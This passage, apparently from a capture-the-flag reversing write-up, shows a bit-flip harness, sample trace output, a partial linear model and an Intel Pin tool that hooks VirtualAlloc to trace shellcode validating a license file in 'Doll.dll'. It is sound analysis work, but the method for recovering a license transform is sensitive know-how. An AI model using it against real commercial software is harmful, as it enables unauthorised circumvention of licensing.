f.write(<span class="string">f&quot;Base license: head=(<span class="subst">&#123;fmt_hex_bytes(base_head)&#125;</span>), tail=<span class="subst">&#123;TAIL_LEN&#125;</span>*FF\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;MARKER_N=<span class="subst">&#123;MARKER_N&#125;</span> (0=first 0xFFFFFFFFFFFFFFFF)\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;Baseline marker line: <span class="subst">&#123;base_marker_line&#125;</span> text: <span class="subst">&#123;base_marker_text&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;Baseline picked: <span class="subst">&#123;base_reg&#125;</span>=0x<span class="subst">&#123;base_q:016X&#125;</span> (line <span class="subst">&#123;base_line&#125;</span>) text: <span class="subst">&#123;base_text&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;Baseline LE: <span class="subst">&#123;fmt_hex_bytes(base_le)&#125;</span>\n\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(HEAD_LEN):</span><br><span class="line">            outidx = INBYTE_TO_OUTIDX[pos]</span><br><span class="line">            f.write(<span class="string">f&quot;=== byte pos <span class="subst">&#123;pos&#125;</span> outidx=<span class="subst">&#123;outidx&#125;</span> ===\n&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                mut = <span class="built_in">bytearray</span>(base_head)</span><br><span class="line">                old = mut[pos]</span><br><span class="line">                mut[pos] ^= (<span class="number">1</span> &lt;&lt; bit)</span><br><span class="line">                new = mut[pos]</span><br><span class="line">                <span class="keyword">if</span> new == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> DEBUG_EACH_RUN:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[dbg:pos<span class="subst">&#123;pos&#125;</span>bit<span class="subst">&#123;bit&#125;</span>] skip (would produce 0x00)&quot;</span>)</span><br><span class="line">                    f.write(<span class="string">f&quot;pos<span class="subst">&#123;pos&#125;</span> bit<span class="subst">&#123;bit&#125;</span>: skip (0x00)\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                lic = write_license_from_head(<span class="built_in">bytes</span>(mut))</span><br><span class="line">                run_pin()</span><br><span class="line">                plain = plaintext_qwords_from_license(lic)</span><br><span class="line">                tag = <span class="string">f&quot;pos<span class="subst">&#123;pos&#125;</span>bit<span class="subst">&#123;bit&#125;</span> <span class="subst">&#123;old:02X&#125;</span>-&gt;<span class="subst">&#123;new:02X&#125;</span>&quot;</span></span><br><span class="line">                got = extract_qword_from_log(LOG_PATH, plain, MARKER_N, dbg_tag=tag)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> got <span class="keyword">or</span> <span class="keyword">not</span> got[<span class="number">0</span>]:</span><br><span class="line">                    f.write(<span class="string">f&quot;pos<span class="subst">&#123;pos&#125;</span> bit<span class="subst">&#123;bit&#125;</span> : <span class="subst">&#123;old:02X&#125;</span>-&gt;<span class="subst">&#123;new:02X&#125;</span>  &lt;parse failed&gt;\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                pick, marker_line, marker_text = got</span><br><span class="line">                q, ln, reg, txt = pick</span><br><span class="line">                le = le_bytes(q)</span><br><span class="line">                delta = <span class="built_in">bytes</span>([le[i] ^ base_le[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">                picked = [le[i] <span class="keyword">for</span> i <span class="keyword">in</span> outidx]</span><br><span class="line">                picked_base = [base_le[i] <span class="keyword">for</span> i <span class="keyword">in</span> outidx]</span><br><span class="line">                picked_delta = [picked[t] ^ picked_base[t] <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(outidx))]</span><br><span class="line">                changed_outidx = [outidx[t] <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(outidx)) <span class="keyword">if</span> picked[t] != picked_base[t]]</span><br><span class="line">                <span class="keyword">if</span> DEBUG_EACH_RUN:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[dbg] pos<span class="subst">&#123;pos&#125;</span> bit<span class="subst">&#123;bit&#125;</span> <span class="subst">&#123;old:02X&#125;</span>-&gt;<span class="subst">&#123;new:02X&#125;</span> &quot;</span></span><br><span class="line">                          <span class="string">f&quot;markerL<span class="subst">&#123;marker_line&#125;</span> pickL<span class="subst">&#123;ln&#125;</span> <span class="subst">&#123;reg&#125;</span>=0x<span class="subst">&#123;q:016X&#125;</span> &quot;</span></span><br><span class="line">                          <span class="string">f&quot;picked_delta=<span class="subst">&#123;fmt_hex_bytes(<span class="built_in">bytes</span>(picked_delta))&#125;</span>&quot;</span>)</span><br><span class="line">                f.write(</span><br><span class="line">                    <span class="string">f&quot;pos<span class="subst">&#123;pos&#125;</span> bit<span class="subst">&#123;bit&#125;</span> : <span class="subst">&#123;old:02X&#125;</span>-&gt;<span class="subst">&#123;new:02X&#125;</span> | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;pick <span class="subst">&#123;reg&#125;</span>=0x<span class="subst">&#123;q:016X&#125;</span> (L<span class="subst">&#123;ln&#125;</span>) | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;LE=<span class="subst">&#123;fmt_hex_bytes(le)&#125;</span> | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;delta=<span class="subst">&#123;fmt_hex_bytes(delta)&#125;</span> | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;picked@outidx=<span class="subst">&#123;fmt_hex_bytes(<span class="built_in">bytes</span>(picked))&#125;</span> | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;picked_delta=<span class="subst">&#123;fmt_hex_bytes(<span class="built_in">bytes</span>(picked_delta))&#125;</span> | &quot;</span></span><br><span class="line">                    <span class="string">f&quot;changed_outidx=<span class="subst">&#123;changed_outidx&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Wrote: <span class="subst">&#123;OUT_PATH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>The output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[dbg:base] hit marker#0 at L9295, pick L9265 rcx=0x306DA92E496427C0</span><br><span class="line">[dbg:pos0bit0 11-&gt;10] hit marker#0 at L9306, pick L9276 rcx=0x326DA92E496126D0</span><br><span class="line">[dbg] pos0 bit0 11-&gt;10 markerL9306 pickL9276 rcx=0x326DA92E496126D0 picked_delta=10 01 05 02</span><br><span class="line">[dbg:pos0bit1 11-&gt;13] hit marker#0 at L9345, pick L9315 rcx=0x346DA92E496E25E0</span><br><span class="line">[dbg] pos0 bit1 11-&gt;13 markerL9345 pickL9315 rcx=0x346DA92E496E25E0 picked_delta=20 02 0a 04</span><br><span class="line">[dbg:pos0bit2 11-&gt;15] hit marker#0 at L9400, pick L9370 rcx=0x386DA92E49702380</span><br><span class="line">[dbg] pos0 bit2 11-&gt;15 markerL9400 pickL9370 rcx=0x386DA92E49702380 picked_delta=40 04 14 08</span><br><span class="line">[dbg:pos0bit3 11-&gt;19] hit marker#0 at L9374, pick L9344 rcx=0x206DA92E494C2F40</span><br><span class="line">[dbg] pos0 bit3 11-&gt;19 markerL9374 pickL9344 rcx=0x206DA92E494C2F40 picked_delta=80 08 28 10</span><br><span class="line">[dbg:pos0bit4 11-&gt;01] hit marker#0 at L9355, pick L9325 rcx=0x106DA92E493436C0</span><br><span class="line">[dbg] pos0 bit4 11-&gt;01 markerL9355 pickL9325 rcx=0x106DA92E493436C0 picked_delta=00 11 50 20</span><br><span class="line">[dbg:pos0bit5 11-&gt;31] hit marker#0 at L9303, pick L9273 rcx=0x706DA92E49C405C0</span><br><span class="line">[dbg] pos0 bit5 11-&gt;31 markerL9303 pickL9273 rcx=0x706DA92E49C405C0 picked_delta=00 22 a0 40</span><br><span class="line">[dbg:pos0bit6 11-&gt;51] hit marker#0 at L9347, pick L9317 rcx=0xB06DA92E482463C0</span><br><span class="line">[dbg] pos0 bit6 11-&gt;51 markerL9347 pickL9317 rcx=0xB06DA92E482463C0 picked_delta=00 44 40 80</span><br><span class="line">[dbg:pos0bit7 11-&gt;91] hit marker#0 at L9364, pick L9334 rcx=0x306DA92F4BE4AFC0</span><br><span class="line">[dbg] pos0 bit7 11-&gt;91 markerL9364 pickL9334 rcx=0x306DA92F4BE4AFC0 picked_delta=00 88 80 00</span><br><span class="line">[dbg:pos1bit0 11-&gt;10] hit marker#0 at L9336, pick L9306 rcx=0x306DA92C4C6537C0</span><br><span class="line">[dbg] pos1 bit0 11-&gt;10 markerL9336 pickL9306 rcx=0x306DA92C4C6537C0 picked_delta=10 01 05 02</span><br><span class="line">[dbg:pos1bit1 11-&gt;13] hit marker#0 at L9377, pick L9347 rcx=0x306DA92A436607C0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Build linear model:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">A</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">B</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ (x &gt;&gt; <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">C</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">D</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ ((x &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">???</span>): ???</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">state</span>):</span><br><span class="line">    out = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    out[<span class="number">0</span>] = A(state[<span class="number">0</span>]) ^ C(state[<span class="number">2</span>]) ^ B(state[<span class="number">3</span>]) ^ D(state[<span class="number">5</span>])</span><br><span class="line">    out[<span class="number">1</span>] = B(state[<span class="number">0</span>]) ^ A(state[<span class="number">1</span>]) ^ C(state[<span class="number">3</span>]) ^ D(state[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">2</span>] = C(state[<span class="number">0</span>]) ^ B(state[<span class="number">1</span>]) ^ A(state[<span class="number">2</span>]) ^ D(state[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">3</span>] = C(state[<span class="number">1</span>]) ^ B(state[<span class="number">2</span>]) ^ A(state[<span class="number">3</span>]) ^ D(state[<span class="number">4</span>])</span><br><span class="line">    out[<span class="number">4</span>] = D(state[<span class="number">1</span>]) ^ E(state[<span class="number">4</span>]) ^ C(state[<span class="number">6</span>]) ^ B(state[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">5</span>] = D(state[<span class="number">2</span>]) ^ B(state[<span class="number">4</span>]) ^ E(state[<span class="number">5</span>]) ^ C(state[<span class="number">7</span>])</span><br><span class="line">    out[<span class="number">6</span>] = D(state[<span class="number">3</span>]) ^ C(state[<span class="number">4</span>]) ^ B(state[<span class="number">5</span>]) ^ E(state[<span class="number">6</span>])</span><br><span class="line">    out[<span class="number">7</span>] = D(state[<span class="number">0</span>]) ^ C(state[<span class="number">5</span>]) ^ B(state[<span class="number">6</span>]) ^ E(state[<span class="number">7</span>])</span><br><span class="line">    K = [<span class="number">0xB7</span>, <span class="number">0x50</span>, <span class="number">0x13</span>, <span class="number">0x3E</span>, <span class="number">0x48</span>, <span class="number">0xCF</span>, <span class="number">0x0B</span>, <span class="number">0x56</span>]</span><br><span class="line">    <span class="keyword">return</span> [out[i] ^ K[i] ^ T(???) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br></pre></td></tr></table></figure>

<p>The part T is an array only contains 0~3, but the value of it is complex. Optimize pin script:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pin.H&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">KNOB&lt;std::string&gt; <span class="title">KnobOut</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;rcx_result.txt&quot;</span>, <span class="string">&quot;result output file&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">KNOB&lt;UINT64&gt; <span class="title">KnobCallRva</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;call_rva&quot;</span>, <span class="string">&quot;0x120B&quot;</span>, <span class="string">&quot;RVA of &#x27;call rsi&#x27; in Doll.dll&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">KNOB&lt;UINT64&gt; <span class="title">KnobSentinel</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;sentinel&quot;</span>, <span class="string">&quot;0xEEEEEEEEEEEEEEEE&quot;</span>, <span class="string">&quot;stop sentinel RCX&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">KNOB&lt;UINT32&gt; <span class="title">KnobMinHexDigits</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;min_hex_digits&quot;</span>, <span class="string">&quot;14&quot;</span>, <span class="string">&quot;valid RCX min hex digits (14 or 15)&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> ADDRINT g_callsite = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> TLS_KEY g_tls;</span><br><span class="line"><span class="type">static</span> FILE* g_fp = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">static</span> PIN_LOCK g_lock;</span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">bool</span> g_done = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TData</span> &#123;</span><br><span class="line">    <span class="type">bool</span> in_sc = <span class="literal">false</span>;</span><br><span class="line">    ADDRINT sc_lo = <span class="number">0</span>, sc_hi = <span class="number">0</span>;</span><br><span class="line">    ADDRINT last_va_base = <span class="number">0</span>;</span><br><span class="line">    ADDRINT last_va_size = <span class="number">0</span>;</span><br><span class="line">    UINT64 last_seen_rcx = <span class="built_in">UINT64</span>(<span class="number">-1</span>);</span><br><span class="line">    UINT64 last_valid_rcx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> has_valid = <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> std::string <span class="title">ToLower</span><span class="params">(std::string s)</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">transform</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), s.<span class="built_in">begin</span>(), [](<span class="type">unsigned</span> <span class="type">char</span> c)&#123; <span class="built_in">return</span> (<span class="type">char</span>)std::<span class="built_in">tolower</span>(c); &#125;);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> UINT32 <span class="title">HexDigits</span><span class="params">(UINT64 v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    UINT32 n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (v) &#123; v &gt;&gt;= <span class="number">4</span>; ++n; &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TData* <span class="title">GetTD</span><span class="params">(THREADID tid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">reinterpret_cast</span>&lt;TData*&gt;(<span class="built_in">PIN_GetThreadData</span>(g_tls, tid));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ThreadStart</span><span class="params">(THREADID tid, CONTEXT*, INT32, VOID*)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="keyword">new</span> <span class="built_in">TData</span>();</span><br><span class="line">    <span class="built_in">PIN_SetThreadData</span>(g_tls, td, tid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ThreadFini</span><span class="params">(THREADID tid, <span class="type">const</span> CONTEXT*, INT32, VOID*)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (td) <span class="keyword">delete</span> td;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">VA_Before</span><span class="params">(THREADID tid, ADDRINT, ADDRINT dwSize, ADDRINT, ADDRINT)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_va_size = dwSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">VA_After</span><span class="params">(THREADID tid, ADDRINT ret)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_va_base = ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">EnterShellcode</span><span class="params">(THREADID tid, ADDRINT shell_entry)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    td-&gt;in_sc = <span class="literal">true</span>;</span><br><span class="line">    td-&gt;last_seen_rcx = <span class="built_in">UINT64</span>(<span class="number">-1</span>);</span><br><span class="line">    td-&gt;last_valid_rcx = <span class="number">0</span>;</span><br><span class="line">    td-&gt;has_valid = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (td-&gt;last_va_base == shell_entry &amp;&amp; td-&gt;last_va_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        td-&gt;sc_lo = td-&gt;last_va_base;</span><br><span class="line">        td-&gt;sc_hi = td-&gt;last_va_base + td-&gt;last_va_size;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        td-&gt;sc_lo = shell_entry;</span><br><span class="line">        td-&gt;sc_hi = shell_entry + <span class="number">0x200000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> ADDRINT <span class="title">ShouldTrack</span><span class="params">(THREADID tid, ADDRINT ip)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_done) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td || !td-&gt;in_sc) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ip &lt; td-&gt;sc_lo || ip &gt;= td-&gt;sc_hi) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">OnRCX</span><span class="params">(THREADID tid, ADDRINT rcx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_done) <span class="keyword">return</span>;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    UINT64 v = (UINT64)rcx;</span><br><span class="line">    <span class="keyword">if</span> (v == td-&gt;last_seen_rcx) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_seen_rcx = v;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> UINT64 sentinel = KnobSentinel.<span class="built_in">Value</span>();</span><br><span class="line">    <span class="type">const</span> UINT32 minDigits = KnobMinHexDigits.<span class="built_in">Value</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v == sentinel) &#123;</span><br><span class="line">        <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!g_done &amp;&amp; g_fp) &#123;</span><br><span class="line">            g_done = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (td-&gt;has_valid) &#123;</span><br><span class="line">                std::<span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;0x%016llX\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)td-&gt;last_valid_rcx);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                std::<span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;0x0000000000000000\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            std::<span class="built_in">fflush</span>(g_fp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">PIN_ExitApplication</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">HexDigits</span>(v) &gt;= minDigits) &#123;</span><br><span class="line">        td-&gt;last_valid_rcx = v;</span><br><span class="line">        td-&gt;has_valid = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ImageLoad</span><span class="params">(IMG img, VOID*)</span> </span>&#123;</span><br><span class="line">    std::string name = <span class="built_in">ToLower</span>(<span class="built_in">IMG_Name</span>(img));</span><br><span class="line"></span><br><span class="line">    RTN va = <span class="built_in">RTN_FindByName</span>(img, <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RTN_Valid</span>(va)) &#123;</span><br><span class="line">        <span class="built_in">RTN_Open</span>(va);</span><br><span class="line">        <span class="built_in">RTN_InsertCall</span>(va, IPOINT_BEFORE, (AFUNPTR)VA_Before,</span><br><span class="line">                       IARG_THREAD_ID,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">0</span>,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">1</span>,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">2</span>,</span><br><span class="line">                       IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">3</span>,</span><br><span class="line">                       IARG_END);</span><br><span class="line">        <span class="built_in">RTN_InsertCall</span>(va, IPOINT_AFTER, (AFUNPTR)VA_After,</span><br><span class="line">                       